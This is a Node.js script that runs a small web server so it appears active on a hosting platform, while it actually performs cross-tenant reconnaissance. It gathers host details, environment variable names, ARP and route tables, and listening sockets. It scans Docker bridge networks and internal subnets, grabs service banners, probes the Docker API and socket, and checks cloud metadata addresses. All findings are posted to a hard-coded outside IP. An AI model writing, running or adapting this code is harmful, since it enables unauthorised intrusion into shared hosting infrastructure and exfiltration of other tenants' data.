const http = require('http');
const net = require('net');
const os = require('os');
const { execSync } = require('child_process');

const REPORT_HOST = '217.25.92.217';
const REPORT_PORT = 8080;
const results = { open_ports: [], arp: '', routes: '', interfaces: {}, self: {}, banners: [], timestamps: {} };

function sendResults(path, data) {
  return new Promise((resolve) => {
    const body = JSON.stringify(data);
    const req = http.request({
      hostname: REPORT_HOST,
      port: REPORT_PORT,
      path: path,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
      timeout: 5000
    }, (res) => { res.resume(); resolve(); });
    req.on('error', () => resolve());
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(body);
    req.end();
  });
}

function scanPort(ip, port, timeoutMs) {
  return new Promise((resolve) => {
    const s = new net.Socket();
    s.setTimeout(timeoutMs);
    s.on('connect', () => {
      results.open_ports.push({ ip, port, status: 'OPEN' });
      // Try to grab banner
      let banner = '';
      s.on('data', (d) => { banner += d.toString().substring(0, 500); });
      setTimeout(() => {
        if (banner) results.banners.push({ ip, port, banner: banner.substring(0, 500) });
        s.destroy();
        resolve();
      }, 1000);
    });
    s.on('timeout', () => { s.destroy(); resolve(); });
    s.on('error', () => { s.destroy(); resolve(); });
    s.connect(port, ip);
  });
}

function tryHTTP(ip, port) {
  return new Promise((resolve) => {
    const req = http.request({
      hostname: ip,
      port: port,
      path: '/',
      method: 'GET',
      timeout: 3000,
      headers: { 'Host': ip, 'User-Agent': 'Mozilla/5.0' }
    }, (res) => {
      let body = '';
      res.on('data', (d) => body += d.toString().substring(0, 2000));
      res.on('end', () => {
        results.banners.push({
          ip, port,
          http_status: res.statusCode,
          http_headers: res.headers,
          http_body_preview: body.substring(0, 1000)
        });
        resolve();
      });
    });
    req.on('error', () => resolve());
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.end();
  });
}

async function main() {
  results.timestamps.start = new Date().toISOString();

  // Collect self info
  results.self = {
    hostname: os.hostname(),
    user: os.userInfo(),
    interfaces: os.networkInterfaces(),
    platform: os.platform(),
    release: os.release(),
    uptime: os.uptime(),
    pid: process.pid,
    uid: process.getuid(),
    env_keys: Object.keys(process.env)
  };

  // Collect network info via system commands
  try { results.arp = execSync('ip neigh 2>/dev/null || arp -a 2>/dev/null || echo "no arp"', { timeout: 5000 }).toString(); } catch(e) { results.arp = 'error: ' + e.message; }
  try { results.routes = execSync('ip route 2>/dev/null || route -n 2>/dev/null || echo "no route"', { timeout: 5000 }).toString(); } catch(e) { results.routes = 'error: ' + e.message; }
  try { results.ss = execSync('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo "no ss"', { timeout: 5000 }).toString(); } catch(e) {}
  try { results.proc_net = execSync('cat /proc/net/tcp 2>/dev/null | head -50', { timeout: 5000 }).toString(); } catch(e) {}

  // Send initial recon
  await sendResults('/cross-tenant-recon', results);

  // Scan both bridge networks
  const ports = [80, 443, 3000, 5432, 3306, 6379, 8080, 8443, 9090, 27017, 5000, 4000, 22, 2375, 2376, 6443, 10250, 9200, 11211];

  // Scan 172.17.0.1-30
  for (let i = 1; i <= 30; i++) {
    const ip = '172.17.0.' + i;
    for (const p of ports) {
      await scanPort(ip, p, 800);
    }
  }

  results.timestamps.net17_done = new Date().toISOString();
  await sendResults('/cross-tenant-scan-17', results);

  // Scan 172.18.0.1-30
  for (let i = 1; i <= 30; i++) {
    const ip = '172.18.0.' + i;
    for (const p of ports) {
      await scanPort(ip, p, 800);
    }
  }

  results.timestamps.net18_done = new Date().toISOString();
  await sendResults('/cross-tenant-scan-18', results);

  // For each open port that could be HTTP, try HTTP request
  const httpPorts = [80, 443, 3000, 8080, 8443, 9090, 5000, 4000, 9200];
  for (const entry of results.open_ports) {
    if (httpPorts.includes(entry.port)) {
      await tryHTTP(entry.ip, entry.port);
    }
  }

  results.timestamps.http_done = new Date().toISOString();

  // Try broader scan - check .0.1 on nearby subnets
  for (let subnet = 19; subnet <= 25; subnet++) {
    const ip = '172.' + subnet + '.0.1';
    await scanPort(ip, 80, 500);
    await scanPort(ip, 443, 500);
    await scanPort(ip, 3000, 500);
  }

  // Also scan 10.0.0.0/24 range (common internal)
  for (let i = 1; i <= 10; i++) {
    const ip = '10.0.0.' + i;
    await scanPort(ip, 80, 500);
    await scanPort(ip, 443, 500);
  }

  results.timestamps.extended_done = new Date().toISOString();

  // Try Docker API on host
  for (const port of [2375, 2376]) {
    await tryHTTP('172.17.0.1', port);
    await tryHTTP('172.18.0.1', port);
  }

  // Try reading Docker socket
  try {
    const fs = require('fs');
    results.docker_socket = fs.existsSync('/var/run/docker.sock') ? 'EXISTS' : 'NOT_FOUND';
  } catch(e) { results.docker_socket = 'error'; }

  // Try cloud metadata
  for (const metaIP of ['169.254.169.254', '100.100.100.200']) {
    await scanPort(metaIP, 80, 1000);
  }

  results.timestamps.finish = new Date().toISOString();

  // Final report with everything
  await sendResults('/cross-tenant-final', results);

  console.log('Scan complete. Open ports found:', results.open_ports.length);
  console.log(JSON.stringify(results.open_ports, null, 2));
}

// Start HTTP server so the app stays "active" for Timeweb
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(results, null, 2));
});

server.listen(3000, () => {
  console.log('Server running on port 3000');
  main().catch(e => console.error('Scan error:', e));
});
